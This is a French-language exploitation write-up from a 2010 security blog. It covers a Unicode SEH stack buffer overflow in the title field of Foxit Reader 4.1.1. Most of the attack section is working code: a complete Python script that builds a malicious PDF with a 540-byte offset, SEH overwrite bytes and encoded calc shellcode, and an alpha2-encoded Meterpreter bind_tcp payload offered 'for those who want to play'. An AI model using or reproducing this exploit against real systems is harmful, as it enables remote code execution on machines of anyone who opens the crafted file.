<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>[Exploitation] Foxit Reader 4.1.1 : Unicode SEH exploitation (1)</title>
  <meta name="description" content="Greetz to corelancod3r, Ivanlef0u, Zenk-Security, HackBBS and a lot more of other people for hacking, helping, tips, etc :).">

  <link rel="stylesheet" href="/binholic/assets/css/main.css">
  <link rel="canonical" href="/binholic/2010/11/19/exploitation-foxit-reader-411-unicode.html">
  <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/binholic/feed.xml">

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({
          google_ad_client: "ca-pub-9302170278788846",
          enable_page_level_ads: true
     });
</script>


  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-16686496-2');
</script>

</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/binholic/">Binary World for Binary People :)</a>

    <!--
    <h2 class="site-subtitle">
        <span class="site-subtitle-quote">"empty
"</span>
        <span class="site-subtitle-author">- no_author -</span>
    </h2>
    -->

    <nav class="site-nav">
      <a href="#" class="menu-icon">
        <svg viewBox="0 0 18 15">
          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
        </svg>
      </a>

      
      <div class="trigger">
        
          
          <a class="page-link" href="/binholic/about/">About</a>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
        <a class="page-link" href="/binholic/blog/">Blog</a>
      </div>
      
    </nav>

  </div>

</header>


    <div class="page-content">
      <div class="wrapper">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">[Exploitation] Foxit Reader 4.1.1 : Unicode SEH exploitation (1)</h1>
    <p class="post-meta"><time datetime="2010-11-19T01:58:00+01:00" itemprop="datePublished">Nov 19, 2010</time> • <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">m_101</span></span></p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <div style="color: red;"><b>Greetz to <a href="http://www.corelan.be:8800/">corelancod3r</a>, <a href="http://www.ivanlef0u.tuxfamily.org/">Ivanlef0u</a>, <a href="https://www.zenk-security.com/">Zenk-Security</a>, <a href="http://hackbbs.org/">HackBBS</a> and a lot more of other people for hacking, helping, tips, etc :).</b></div>

<p>Salut!</p>

<p>Aujourd’hui je vais vous parler de l’exploitation de Foxit Reader 4.1.1. En effet, ce lecteur PDF est susceptible à un stack-based buffer overflow dans le champ du titre d’un PDF. La faille a été corrigée dans la version 4.2.</p>

<p>J’ai basé mon analyse sur celle faite par Sud0 sur le site de <a href="http://www.corelan.be:8800/">corelancod3r</a> car je voulais avant tout jouer avec l’unicode :) (et puis un article français en plus ne fera pas de mal ;)).</p>

<p>Let’s go!</p>

<h1 id="préparatifs">Préparatifs</h1>

<p>Pour triggerer cette vulnerabilitée, on a 2 pré-requis :</p>

<ul>
  <li>DisplayDocTitle à true</li>
  <li>un titre plus que long</li>
</ul>

<p>Comme à notre habitude, on génère un pattern metasploit :</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre>msf/tools/pattern_create 10000 <span class="o">&gt;</span> msfpattern.txt</pre></td></tr></tbody></table></code></pre></figure>

<p>Au lieu d’utiliser le PoC présenté il y a quelques jours car je ne trouvais pas pratique d’éditer le fichier à chaque fois pour faire mes ajustement, j’ai préférer me générer mes PDFs avec Python et ReportLab.</p>

<p>Il faut tout d’abord patcher votre reportlab pour ajouter la directive DisplayDocTitle :</p>

<figure class="highlight"><pre><code class="language-diff" data-lang="diff"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="code"><pre><span class="gd">--- ./pdfdoc.py 2010-11-17 15:30:00.572930001 +0100
</span><span class="gi">+++ /usr/lib/python2.6/dist-packages/reportlab/pdfbase/pdfdoc.py 2010-11-17 15:37:21.662930001 +0100
</span><span class="gu">@@ -702,6 +702,7 @@
</span>                 HideWindowUI=checkPDFBoolean,
                 FitWindow=checkPDFBoolean,
                 CenterWindow=checkPDFBoolean,
<span class="gi">+                DisplayDocTitle=checkPDFBoolean,
</span>                 NonFullScreenPageMode=checkPDFNames(*'UseNone UseOutlines UseThumbs UseOC'.split()),
                 Direction=checkPDFNames(*'L2R R2L'.split()),
                 ViewArea=checkPDFNames(*'MediaBox CropBox BleedBox TrimBox ArtBox'.split()),</pre></td></tr></tbody></table></code></pre></figure>

<p>Une fois tout celà patché, on est fin prêt à générer notre fichier PDF avec le script suivant :</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre></td><td class="code"><pre><span class="c1">#!/usr/bin/python
</span>
<span class="c1"># author : m_101
</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">reportlab.pdfgen</span> <span class="kn">import</span> <span class="n">canvas</span>
<span class="kn">from</span> <span class="nn">reportlab.lib.units</span> <span class="kn">import</span> <span class="n">inch</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"Usage : </span><span class="si">%</span><span class="s">s output"</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="c1"># filename
</span><span class="n">filename</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="c1"># get msfpattern
</span><span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'msfpattern.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span>
<span class="n">msfpattern</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">print</span> <span class="s">'Creating '</span> <span class="o">+</span> <span class="n">filename</span> <span class="o">+</span> <span class="s">' exploit file'</span>
<span class="c1"># create pdf
</span><span class="n">pdf</span> <span class="o">=</span> <span class="n">canvas</span><span class="o">.</span><span class="n">Canvas</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
<span class="c1"># document characteristics
</span><span class="n">pdf</span><span class="o">.</span><span class="n">setTitle</span><span class="p">(</span><span class="n">msfpattern</span><span class="p">)</span>
<span class="n">pdf</span><span class="o">.</span><span class="n">setSubject</span><span class="p">(</span><span class="s">'Foxit 4.1.1 unicode title overflow'</span><span class="p">)</span>
<span class="n">pdf</span><span class="o">.</span><span class="n">setAuthor</span><span class="p">(</span><span class="s">'m_101'</span><span class="p">)</span>
<span class="n">pdf</span><span class="o">.</span><span class="n">setViewerPreference</span><span class="p">(</span><span class="s">'DisplayDocTitle'</span><span class="p">,</span> <span class="s">'true'</span><span class="p">)</span> <span class="c1"># compulsory to trigger the vuln
</span>
<span class="c1"># define a large font
</span><span class="n">pdf</span><span class="o">.</span><span class="n">setFont</span><span class="p">(</span><span class="s">"Helvetica"</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
<span class="c1"># say hello (note after rotate the y coord needs to be negative!)
</span><span class="n">pdf</span><span class="o">.</span><span class="n">drawString</span><span class="p">(</span><span class="n">inch</span><span class="p">,</span> <span class="mi">10</span><span class="o">*</span><span class="n">inch</span><span class="p">,</span> <span class="s">"Not hacked :)"</span><span class="p">)</span>

<span class="n">pdf</span><span class="o">.</span><span class="n">showPage</span><span class="p">()</span>
<span class="n">pdf</span><span class="o">.</span><span class="n">save</span><span class="p">()</span>

<span class="k">print</span> <span class="s">"Have fun :)"</span></pre></td></tr></tbody></table></code></pre></figure>

<h1 id="triggering-the-vuln">Triggering the vuln’</h1>

<p>Une fois notre fichier généré, on lance Foxit dans <a href="http://www.immunityinc.com/products-immdbg.shtml">ImmunityDbg</a> et Foxit crash à l’ouverture du fichier :</p>

<p><img src="/binholic/assets/img/foxit_411_exploit_debug_poc.png" alt="Foxit reader 4.1.1 crash" /></p>

<p>On remarque que notre seh handler contient une chaîne de type 00xx00xx : de l’unicode!!!</p>

<p>Pour trouver l’offset, on utilise le plugin de corelancod3r : <a href="http://redmine.corelan.be:8800/projects/pvefindaddr">pvefindaddr</a></p>

<p><img src="/binholic/assets/img/foxit_411_exploit_pvefindaddr.png" alt="Foxit reader 4.1.1 pvefindaddr" /></p>

<p>On écrase donc nseh au bout de 540 octets.
Avant de continuer, une petite base sur l’exploitation unicode.</p>

<h1 id="exploiting-with-unicode-payload">Exploiting with unicode payload</h1>

<p>Pendant longtemps, les gens ont pensés que l’exploitation unicode était impossible et Chris Anley a montré le contraire :).
Le trick dans l’exploitation d’un bof unicode est d’utiliser des instructions de 1 octet pour padder au besoin et aller avec des instructions de 3 octets.
Par exemple :</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
</pre></td><td class="code"><pre><span class="mi">5</span><span class="n">a</span>          <span class="k">pop</span> <span class="n">edx</span>
<span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span>    <span class="k">add</span> <span class="p">[ecx],</span> <span class="n">al</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Ou encore :</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="code"><pre><span class="mi">6</span><span class="n">a</span> <span class="mi">00</span>       <span class="k">push</span> <span class="n">byte</span> <span class="mh">0x0</span>
<span class="mi">58</span>          <span class="k">pop</span> <span class="n">ax</span>
<span class="mi">00</span> <span class="mi">45</span> <span class="mi">00</span>    <span class="k">add</span> <span class="err">[</span><span class="n">di</span><span class="o">+</span><span class="mh">0x0</span><span class="err">]</span><span class="p">,</span> <span class="n">al</span></pre></td></tr></tbody></table></code></pre></figure>

<p>On peut voir que dans les deux cas on doit avoir un pointeur valide ou sinon nous aurons un “Access Violation” ou SIGSEV.
On peut considérer une instruction comme nop dès lors qu’elle n’influe pas sur notre exploitation à proprement parler. Les instructions de 3 bytes montrées peuvent servir à patcher la mémoire aussi.</p>

<p>Pour l’exploitation avec une payload unicode, on ne peut tout simplement pas faire de JMP directs. On a des POP, PUSH, XOR, ADD, RET et quelques autres instructions. On oublie les conditions
On peut également bridger et re-écrire directement dans la mémoire : on contrôle des pointeurs! :) Le principe évoqué dans <a href="http://www.phrack.org/archives/61/p61_0x0b_Building%20IA32%20%27Unicode-Proof%27%20Shellcodes_by_obscou.txt">Building IA32 ‘Unicode-Proof’ Shellcodes</a> est de patcher la mémoire pour reconstruire notre shellcode ^^.</p>

<p>Au final, les deux payloads vont se rencontrer et on continue notre exécution dans notre payload reconstruite. Le principe est illustré dans <a href="http://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441/">The art of exploitation</a> au chapitre 0x691.</p>

<p>Vous pouvez ainsi commencer à coder en full alphanumeric puis patcher avec la technique ci-dessus. Bon évidemment coder une full payload en unicode est contre-productif, on va utiliser des encodeurs style alpha2 :).</p>

<p>Pour plus de détails, je vous invite à lire les papers bien écrits et détaillés que j’ai mis en liens à la fin de l’article.</p>

<p>Il nous faut trouver une addresse compatible unicode et qui soit aussi des instructions.
Lancer la commande suivante sous ImmunityDbg:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre><span class="o">!</span>pvefindaddr p1</pre></td></tr></tbody></table></code></pre></figure>

<p>Ensuite filtrant uniquement ceux qui nous intéressent (je suis sous Linux avec une VM VirtualBox) :</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre><span class="nb">cat </span>ppr1.txt | <span class="nb">grep</span> <span class="nt">-i</span> unicode | egrep <span class="nt">-vi</span> <span class="s2">"(maybe|ansi)"</span> <span class="o">&gt;</span> ppr-unicode.txt</pre></td></tr></tbody></table></code></pre></figure>

<p>Perso’ j’ai choisi l’addresse suivante : 0x004d002f</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
</pre></td><td class="code"><pre><span class="mi">2</span><span class="n">f</span>            <span class="k">das</span>
<span class="mi">00</span> <span class="mi">4</span><span class="n">d</span> <span class="mi">00</span>      <span class="k">add</span> <span class="p">[ecx],</span> <span class="n">cl</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Il nous faut donc une adresse valide pour ECX ou on aura droit à un AV.</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
</pre></td><td class="code"><pre><span class="mi">59</span>        <span class="k">pop</span> <span class="n">ecx</span>
<span class="mi">00</span> <span class="mi">41</span> <span class="mi">00</span>  <span class="k">add</span> <span class="n">byte</span> <span class="p">[ecx],</span> <span class="n">al</span></pre></td></tr></tbody></table></code></pre></figure>

<p>On va ici utiliser l’encodeur de metasploit :</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="code"><pre>m_101@m_101-laptop:~/repos/msf<span class="nv">$ </span>./msfpayload windows/exec <span class="nv">CMD</span><span class="o">=</span>calc R | ./msfencode <span class="nt">-e</span> x86/alpha_mixed <span class="nt">-t</span> raw | ./msfencode <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-e</span> x86/unicode_mixed <span class="nv">BufferRegister</span><span class="o">=</span>ESP <span class="nt">-t</span> raw
<span class="o">[</span><span class="k">*</span><span class="o">]</span> x86/alpha_mixed succeeded with size 456 <span class="o">(</span><span class="nv">iteration</span><span class="o">=</span>1<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> x86/unicode_mixed succeeded with size 1038 <span class="o">(</span><span class="nv">iteration</span><span class="o">=</span>1<span class="o">)</span>

TUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBDIGvJ9I6FyD6L4QNB6PYQ9Q9PIPIQ9Q9Q9PIPIPIQ3PCQ3PCQ3PCP7PQPZQZQ1B8PPP0Q1P0Q1BKQ1Q1B1P2Q1Q2P2Q2Q2P0Q2Q2Q1Q2PXB0P8Q1Q2PuPJPIPIBLPMP8PKP9Q7D0Q7BPQ5B0PQD0PNBIPJQ5Q6PQPJBRB1PtPNPkPBPrPPP0PLPKB0B2Q6PlPLPKPQPBQ5Q4PNBKPCPBPDBHPDPOPHP7B1PZQ4C6Q5PaPIPoPEQQPKPpPLBLPGPLPQPqPCPLQ7QbQ6PLPQP0PJPaPJPoQ6PmQ7D1PKD7Q8BBPLP0PQQ2Q6P7PLPKPBD2PBP0PLPKB1B2Q7PLQ6C1PHB0PNBKPQB0B1PhPOD5POP0Q4P4Q3QjQ6PaPNP0PFP0PNPkPCPxPDPXPNPkPPPXPEPpQ6PaQ9Q3PIQcPGPLPPQ9PLPKPFQDPLPKQ5PQPJPvPEQQPKPOQ5QQQ9B0PLPlPJC1Q8POPDPMQ3P1PKCGQ7Q8PKPPB1PeQ8QdQ7QcB1BMPKPHPEPkB1BMQ4C4Q2PUPMP2Q2D8PLPKQ6P8PDQTPEPQPNP3Q2PFPNPkPDPLB0PKPNBKQ3C8Q7PlPCP1PNP3PNBKPFBDPLPKQ3P1PNP0POCIPQQDB1P4Q7QDPQPKB1PKB0PaQ2PyPCQZQ6P1PKPOQ9D0PQPHPQPOPBQjPNPkQ7QRPJPKPKP6Q3BMPQPzPGBQPNBMPOD5POPIPEB0PCP0Q3P0PPPPPQPxB0P1PLPKPPBOPMPWPIPoQ8B5POPKPJPPPHP5PLBBQ2D6PCB8PLPfPLPUPOPMPMPMPKPOPNP5PGPLQ7PvQ3PLQ4PJPOBPPIPkPMP0PDP5PGPuPOPKPGP7PEPCQ4P2PPBOPQQjPCP0PBQcPIBOPKPeQ2Q3B0PaB0BLPEP3Q7PpPEQJQ1Q1AA</pre></td></tr></tbody></table></code></pre></figure>

<p>Pour l’encodeur metasploit ou alpha2, il faut padder le buffer et  reajuster pour que le registre choisi pointe directement sur le premier  octet de la payload unicode.
Une fois cette chose faite, on relance notre sploit.</p>

<p>On se rend compte qu’on a un “Access Violation” à cause d’un pointeur non valide, or on sait que ECX est valide :).</p>

<p><img src="/binholic/assets/img/foxit_411_exploit_debug_payload.png" alt="Foxit reader 4.1.1 debug payload" /></p>

<p>On change donc le premier U en a (0x55 =&gt; 0x61) pour avoir un pointeur valide.</p>

<p>Notre registre pointe désormais sur notre payload unicode et nos pointeurs sont tous valides, pawn!! :)</p>

<h1 id="the-exploit">The Exploit</h1>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
</pre></td><td class="code"><pre><span class="c1">#!/usr/bin/python
</span>
<span class="c1"># author : m_101
</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">reportlab.pdfgen</span> <span class="kn">import</span> <span class="n">canvas</span>
<span class="kn">from</span> <span class="nn">reportlab.lib.units</span> <span class="kn">import</span> <span class="n">inch</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"Usage : </span><span class="si">%</span><span class="s">s output"</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="c1"># filename
</span><span class="n">filename</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> 
<span class="c1"># 59        pop ecx
# 00 41 00  add byte [ecx], al
</span><span class="n">nseh</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x59\x41</span><span class="s">"</span>   <span class="c1"># nops
# 2f        das
# 00 4d 00  add [ebx+0x0], cl
</span><span class="n">seh</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x2f\x4d</span><span class="s">"</span>    <span class="c1"># pop pop ret
</span>
<span class="c1"># get the interesting values
</span><span class="n">fixaddr</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x5a</span><span class="s">"</span>    <span class="c1"># 5a                pop edx             ; we pop buffer address
</span><span class="n">fixaddr</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x41</span><span class="s">"</span>   <span class="c1"># 00 41 00          add [ecx+0x0], al   ; nop
</span><span class="n">fixaddr</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x5c</span><span class="s">"</span>   <span class="c1"># 5c                pop esp             ; we pop nseh address
</span><span class="n">fixaddr</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x41</span><span class="s">"</span>   <span class="c1"># 00 45 00          add [ecx+0x0], al   ; nop
</span>
<span class="c1"># fix base address to make it point to the beginning of shellcode
</span><span class="n">fixaddr</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x61</span><span class="s">"</span>   <span class="c1"># 61                popadd
</span><span class="n">fixaddr</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x41</span><span class="s">"</span>   <span class="c1"># 00 45 00          add [ecx+0x0], al   ; nop
</span>
<span class="n">fixaddr</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x41</span><span class="s">"</span>   <span class="c1"># 41                inc ecx
</span><span class="n">fixaddr</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x41</span><span class="s">"</span>   <span class="c1"># 00 45 00          add [ecx+0x0], al   ; nop
</span>
<span class="c1"># ecx = 0x00350035 (writable address after popadd)
</span><span class="n">addr</span> <span class="o">=</span> <span class="s">'55N'</span>        <span class="c1"># 35 00 35 00 4e    xor eax, 0x4e003500
</span><span class="n">addr</span> <span class="o">+=</span> <span class="s">'A'</span>         <span class="c1"># 00 41 00          add [ecx+0x0], al
# payload
# encoders : x86/alpha_mixed + x86/unicode_upper
</span><span class="n">calc</span> <span class="o">=</span> <span class="s">'TaYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBCYGuIJHIFyCEJTB8PPQIQ9PIQ9Q9Q9PIPIPIQ9Q9PCQ3Q3Q3Q3PCP7PQPZPjQ1B8PPP0Q1P0Q1PkQ1Q1PQP2Q1Q2P2PBPBP0Q2PBQ1Q2PXB0P8Q1Q2D5PJPIQ9PlPICHPKP9Q7BPPGPpQ3P0Q5P0POD9PKPUQ4PqPNP2PEP4PNPkPFP2B0P0PLPKPFP2PDPLPLPKPFP2PBP4PNPkPPD2Q7QHPDPOPLCGPBPjQ6PFPPP1Q9PoQ5PaPIB0PLPlQ7PLPEP1B1BLPDQ2Q4PlB1P0PJPaPJBOQ6PmQ5B1PJC7PID2PJB0B1Q2PCBGPNPkB0PRPFPpPNPkPCBRPGPLPFC1PNP0PNPkQ3D0PCQ8PLQ5PIB0PCQ4Q2BJQ3P1PNP0Q2PpPNBKB0PHPEQ8PLPKPBPxQ5BPPGPqPKPcPKQCQ5PlB0Q9PLPKQ7PDPLPKPFC1PNP6Q4PqPKPOQ5PaQ9B0PNPLPOP1Q8POQ4PMQ3P1PKBWQ7PHPKB0Q3Q5PKPDPGD3B1BMQ8PxQ5BKPCPMPGPTB1PePJQ2PQQ8PNBKQ6P8PEPtPGPqPKQSB0QVPNBKPFPlPBPkPLPKPCQXPEPLQ6C1PIPCPNBKQ6PdPLPKQ5B1PJPpPLQ9Q7P4PFPDB1P4PCPkPQPKQ3B1Q3C9PCBJPBD1PKPOPMP0PBCHPCPoQ3BJPLPKQ2P2PJPKPLPFQ3PmQ3QJPEPQPLPMPMPUPLCIQ7PpQ7D0Q7D0B0PPPBQ8PFPQPNPkPPBOPMPWQ9PoQ9PEPOPKPLP0Q8P5Q9P2B0QFQ5P8PNPFPJP5POPMPMPMPIBOPKQUPEPlQ7QfQ3PLQ7QjPMB0PIBKPKB0B0CEPCP5PMBKQ7P7PEPCPDP2B0PoPPPjPCP0PBD3PKPOPNP5Q3PSQ3PQB0PlPCB3Q5B0PFQZQ1Q1AA'</span>

<span class="c1">#
</span><span class="n">trigger</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">540</span>
<span class="n">title</span> <span class="o">=</span> <span class="n">trigger</span> <span class="o">+</span> <span class="n">nseh</span> <span class="o">+</span> <span class="n">seh</span> <span class="o">+</span> <span class="n">fixaddr</span> <span class="o">+</span> <span class="n">addr</span> <span class="o">+</span> <span class="n">calc</span>

<span class="k">print</span> <span class="s">'Creating '</span> <span class="o">+</span> <span class="n">filename</span> <span class="o">+</span> <span class="s">' exploit file'</span>
<span class="c1"># create pdf
</span><span class="n">pdf</span> <span class="o">=</span> <span class="n">canvas</span><span class="o">.</span><span class="n">Canvas</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
<span class="c1"># document characteristics
</span><span class="n">pdf</span><span class="o">.</span><span class="n">setTitle</span><span class="p">(</span><span class="n">title</span><span class="p">)</span>
<span class="n">pdf</span><span class="o">.</span><span class="n">setSubject</span><span class="p">(</span><span class="s">'Foxit 4.1.1 unicode title overflow'</span><span class="p">)</span>
<span class="n">pdf</span><span class="o">.</span><span class="n">setAuthor</span><span class="p">(</span><span class="s">'m_101'</span><span class="p">)</span>
<span class="n">pdf</span><span class="o">.</span><span class="n">setViewerPreference</span><span class="p">(</span><span class="s">'DisplayDocTitle'</span><span class="p">,</span> <span class="s">'true'</span><span class="p">)</span> <span class="c1"># compulsory to trigger the vuln
</span>
<span class="c1"># define a large font
</span><span class="n">pdf</span><span class="o">.</span><span class="n">setFont</span><span class="p">(</span><span class="s">"Helvetica"</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
<span class="c1"># say hello (note after rotate the y coord needs to be negative!)
</span><span class="n">pdf</span><span class="o">.</span><span class="n">drawString</span><span class="p">(</span><span class="n">inch</span><span class="p">,</span> <span class="mi">10</span><span class="o">*</span><span class="n">inch</span><span class="p">,</span> <span class="s">"Not hacked :)"</span><span class="p">)</span>

<span class="n">pdf</span><span class="o">.</span><span class="n">showPage</span><span class="p">()</span>
<span class="n">pdf</span><span class="o">.</span><span class="n">save</span><span class="p">()</span>

<span class="k">print</span> <span class="s">"Have fun :)"</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Ce script génère un fichier pdf avec le lancement d’une calculatrice :</p>

<p>Si on veut plus qu’une calculatrice, l’encodeur metasploit n’est pas adapté car il génère de trop grande payload.
L’encodeur alpha2 original est plus efficace.
Voilà la payload meterpreter pour ceux qui veulent jouer ^^ :</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="code"><pre>m_101@m_101-laptop:~/repos/msf<span class="nv">$ </span>./msfpayload windows/meterpreter/bind_tcp R | ./msfencode <span class="nt">-b</span> ‘<span class="se">\x</span>00′ <span class="nt">-t</span> raw <span class="o">&gt;</span> ~/data/exploit/meterpreter_tcp.bin
m_101@m_101-laptop:~/data/exploit<span class="nv">$ </span>./alpha2 <span class="nt">--unicode</span> esp &lt; meterpreter_tcp.bin
TUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBLsI9WNNHnnwJrpXZYNHYqdNDZTX1nkQORcWWYtnQT7ZoLC47LOzBIMWBNrJyKmNkdcQj5D6NSbdhgRUke73LaqxnLkl6WWKjWOBZVoNMzhLpMYkSsYYdJUxOOYtV3YZm3n1hvP7mFsPykEm0mKnKTnNotNwlIKLRLSYLLKLYnKVFNNINGhKlNQlOd0lj1i4wKJ2TNy5vLobGW5qqoTOlonjpDM4lUOKrJQRC5N4JkL2ZWwLmmOm9mCPNsrLJ9PnLRXsnzTSgLKNX7lnFGoiORwo5V4BtyoLiLkpxSDR5SpQoqJwol2OkcN5kW1XBmWqQM7JZMgVm9hOnOLylHmgiKopiuqz7SopiNmBOZLOkvrYKpzhP3kWU3MN74vX2lQK6Mi93nXNMrMRsPRu4LNcHURMYYKlol2reedBofBQUQUpxeXaYnz68Z3VChss8jPkoDTQx9vDqnXit9P9KZ0OPWKsCJs6W0t7sbL5MLi7LyjtiO4pzKTLjqSKxW9tBySWKEQLVlR7LjOONmsNKpevOLfhMBZzZJ2LMxoKQBTnyqwlKEQ4myxl354fEsQ1Qs6XRXmQUPfO288ZObFOZklntNUbOosmqMZOLjV2JJz4PPQZc3pVoSf4LQKMjKw8ptJlCTmYp6YaW2MK6A</pre></td></tr></tbody></table></code></pre></figure>

<p>Changez le premier U en a et tout ira bien :).</p>

<p>Have fun,</p>

<p>m_101</p>

<h1 id="ressources">Ressources</h1>

<ul>
  <li><a href="http://www.blogger.com/www.net-security.org/dl/articles/unicodebo.pdf">The venetian exploit</a></li>
  <li><a href="https://www.blackhat.com/presentations/win-usa-04/bh-win-04-fx.pdf">Practical Win32 unicode exploitation</a></li>
